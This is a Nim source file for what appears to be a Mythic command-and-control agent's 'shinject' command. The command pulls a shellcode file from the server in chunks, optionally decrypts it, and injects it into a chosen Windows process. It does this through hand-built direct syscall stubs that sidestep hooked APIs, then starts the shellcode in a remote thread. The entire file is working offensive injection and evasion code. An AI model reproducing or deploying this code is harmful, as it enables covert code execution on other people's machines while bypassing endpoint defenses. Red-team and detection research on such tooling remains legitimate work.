import json

when defined(windows):
  import base64
  import winim/lean
  import ../utils/[delegates, dinvoke, crypto]
  import strutils
  
  type
    ShinjectArgs = object
      pid: int
      uuid: string
      encryption: string
      key: string
      iv: string
      nonce: string

const CHUNK_SIZE = 512000

proc shinject*(taskId: string, params: JsonNode): JsonNode =
  ## Inject shellcode into a remote process using direct syscalls
  when not defined(windows):
    return %*{
      "task_id": taskId,
      "completed": true,
      "status": "error",
      "user_output": "shinject is only supported on Windows"
    }
  else:
    try:
      let args = to(params, ShinjectArgs)
      
      # Step 1: Request the shellcode file from Mythic
      return %*{
        "task_id": taskId,
        "upload": {
          "file_id": args.uuid,
          "chunk_num": 1,
          "chunk_size": CHUNK_SIZE,
          "full_path": ""
        }
      }
    except Exception as e:
      return %*{
        "task_id": taskId,
        "completed": true,
        "status": "error",
        "user_output": "Failed to parse shinject parameters: " & e.msg
      }

proc processShinjectChunk*(taskId: string, params: JsonNode, chunkData: string, 
                          totalChunks: int, currentChunk: int, 
                          fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the shellcode file being downloaded
  when defined(windows):
    try:
      let args = to(params, ShinjectArgs)
      
      # Decode and append chunk data
      let decodedChunk = decode(chunkData)
      for b in decodedChunk:
        fileData.add(cast[byte](b))
      
      # If more chunks remain, request the next one
      if currentChunk < totalChunks:
        return %*{
          "task_id": taskId,
          "upload": {
            "chunk_size": CHUNK_SIZE,
            "file_id": args.uuid,
            "chunk_num": currentChunk + 1,
            "full_path": ""
          }
        }
      
      var output = "Injecting shellcode into remote process with PID " & $args.pid & "...\n"

      if args.encryption != "" and args.encryption != "none":
        output.add("[*] Decrypting shellcode with " & args.encryption & "...\n")
        try:
          decryptPayload(fileData, args.encryption, args.key, args.iv, args.nonce)
          output.add("[+] Decryption successful (" & $fileData.len & " bytes)\n")
        except Exception as e:
          return %*{
            "task_id": taskId,
            "completed": true,
            "status": "error",
            "user_output": output & "[-] Decryption failed: " & e.msg
          }
      
      let currProcess = GetCurrentProcessId()
      var
        ret: NTSTATUS
        hProcess: HANDLE
        hProcessCurr: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, currProcess)
        hThread: HANDLE
        oa: OBJECT_ATTRIBUTES
        ci: CLIENT_ID
        allocAddr: PVOID = nil
        bytesWritten: SIZE_T
        oldProtect: DWORD
      
      ci.UniqueProcess = cast[HANDLE](args.pid)
      
      # Allocate memory for syscall stubs
      let stubsSize = cast[SIZE_T](SYSCALL_STUB_SIZE * 5)
      let sysNtOpenProcess = VirtualAllocEx(
        hProcessCurr,
        nil,
        stubsSize,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
      )
      
      if sysNtOpenProcess == nil:
        return %*{
          "task_id": taskId,
          "completed": true,
          "status": "error",
          "user_output": "Failed to allocate memory for syscall stubs"
        }
      
      # Setup syscall stubs
      var dNtOpenProcess: NtOpenProcess = cast[NtOpenProcess](sysNtOpenProcess)
      discard VirtualProtect(sysNtOpenProcess, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect)
      discard GetSyscallStub("NtOpenProcess", sysNtOpenProcess)
      
      var sysNtAllocateVirtualMemory = cast[pointer](cast[uint](sysNtOpenProcess) + cast[uint](SYSCALL_STUB_SIZE))
      let dNtAllocateVirtualMemory = cast[NtAllocateVirtualMemory](sysNtAllocateVirtualMemory)
      discard VirtualProtect(sysNtAllocateVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect)
      discard GetSyscallStub("NtAllocateVirtualMemory", sysNtAllocateVirtualMemory)
      
      var sysNtWriteVirtualMemory = cast[pointer](cast[uint](sysNtAllocateVirtualMemory) + cast[uint](SYSCALL_STUB_SIZE))
      let dNtWriteVirtualMemory = cast[NtWriteVirtualMemory](sysNtWriteVirtualMemory)
      discard VirtualProtect(sysNtWriteVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect)
      discard GetSyscallStub("NtWriteVirtualMemory", sysNtWriteVirtualMemory)
      
      var sysNtProtectVirtualMemory = cast[pointer](cast[uint](sysNtWriteVirtualMemory) + cast[uint](SYSCALL_STUB_SIZE))
      let dNtProtectVirtualMemory = cast[NtProtectVirtualMemory](sysNtProtectVirtualMemory)
      discard VirtualProtect(sysNtProtectVirtualMemory, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect)
      discard GetSyscallStub("NtProtectVirtualMemory", sysNtProtectVirtualMemory)
      
      var sysNtCreateThreadEx = cast[pointer](cast[uint](sysNtProtectVirtualMemory) + cast[uint](SYSCALL_STUB_SIZE))
      let dNtCreateThreadEx = cast[NtCreateThreadEx](sysNtCreateThreadEx)
      discard VirtualProtect(sysNtCreateThreadEx, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtect)
      discard GetSyscallStub("NtCreateThreadEx", sysNtCreateThreadEx)
      
      # Open target process
      ret = dNtOpenProcess(
        addr hProcess,
        PROCESS_ALL_ACCESS,
        addr oa,
        addr ci
      )
      
      if ret == 0:
        output.add("[+] NtOpenProcess OK\n")
      else:
        return %*{
          "task_id": taskId,
          "completed": true,
          "status": "error",
          "user_output": output & "[-] NtOpenProcess failed! Check if the target PID exists and that you have the appropriate permissions\n"
        }
      
      # Allocate memory in target process
      var shellcodeSize: SIZE_T = cast[SIZE_T](fileData.len)
      ret = dNtAllocateVirtualMemory(
        hProcess,
        addr allocAddr,
        0,
        addr shellcodeSize,
        MEM_COMMIT,
        PAGE_READWRITE
      )
      
      if ret == 0:
        output.add("[+] NtAllocateVirtualMemory OK\n")
      else:
        CloseHandle(hProcess)
        return %*{
          "task_id": taskId,
          "completed": true,
          "status": "error",
          "user_output": output & "[-] NtAllocateVirtualMemory failed!\n"
        }
      
      # Write shellcode to target process
      ret = dNtWriteVirtualMemory(
        hProcess,
        allocAddr,
        unsafeAddr fileData[0],
        shellcodeSize,
        addr bytesWritten
      )
      
      if ret == 0:
        output.add("[+] NtWriteVirtualMemory OK\n")
        output.add("  \\_ Bytes written: " & $bytesWritten & " bytes\n")
      else:
        CloseHandle(hProcess)
        return %*{
          "task_id": taskId,
          "completed": true,
          "status": "error",
          "user_output": output & "[-] NtWriteVirtualMemory failed!\n"
        }
      
      # Change memory protection to executable
      var protectAddr = allocAddr
      var shellcodeSize2: SIZE_T = cast[SIZE_T](fileData.len)
      ret = dNtProtectVirtualMemory(
        hProcess,
        addr protectAddr,
        addr shellcodeSize2,
        PAGE_EXECUTE_READ,
        addr oldProtect
      )
      
      if ret == 0:
        output.add("[+] NtProtectVirtualMemory OK\n")
      else:
        CloseHandle(hProcess)
        return %*{
          "task_id": taskId,
          "completed": true,
          "status": "error",
          "user_output": output & "[-] NtProtectVirtualMemory failed!\n"
        }
      
      # Create remote thread to execute shellcode
      ret = dNtCreateThreadEx(
        addr hThread,
        THREAD_ALL_ACCESS,
        nil,
        hProcess,
        allocAddr,
        nil,
        FALSE,
        0,
        0,
        0,
        nil
      )
      
      if ret == 0:
        output.add("[+] NtCreateThreadEx OK\n")
      else:
        CloseHandle(hProcess)
        return %*{
          "task_id": taskId,
          "completed": true,
          "status": "error",
          "user_output": output & "[-] NtCreateThreadEx failed!\n"
        }
      
      CloseHandle(hThread)
      CloseHandle(hProcess)
      
      output.add("[+] Injection successful!")
      
      return %*{
        "task_id": taskId,
        "completed": true,
        "status": "success",
        "user_output": output
      }
      
    except Exception as e:
      return %*{
        "task_id": taskId,
        "completed": true,
        "status": "error",
        "user_output": "Failed to inject shellcode: " & e.msg
      }
  else:
    return %*{
      "task_id": taskId,
      "completed": true,
      "status": "error",
      "user_output": "shinject is only supported on Windows"
    } 